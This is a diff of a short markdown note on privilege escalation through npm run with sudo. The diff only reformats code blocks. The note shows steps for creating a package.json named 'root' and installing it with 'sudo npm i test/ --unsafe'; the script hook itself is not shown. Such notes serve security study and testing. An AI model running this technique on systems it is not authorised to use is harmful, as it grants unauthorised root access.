@@ -4,14 +4,13 @@ date: 2024-6-26
 tags: ["npm", "nodejs", "privesc", "sudo"]
 ---
 
----
 #### SUDO
 
 Create a 'package.json'
 
 <div>
 
-```json
+```console
 {
   "name": "root",
   "version": "1.0.0",
@@ -27,15 +26,15 @@ Create a 'package.json'
 
 <div>
 
-```bash
+```console
 mkdir test
 ```
 
-```bash
+```console
 mv package.json test/
 ```
 
-```bash
+```console
 sudo npm i test/ --unsafe
 ```
 
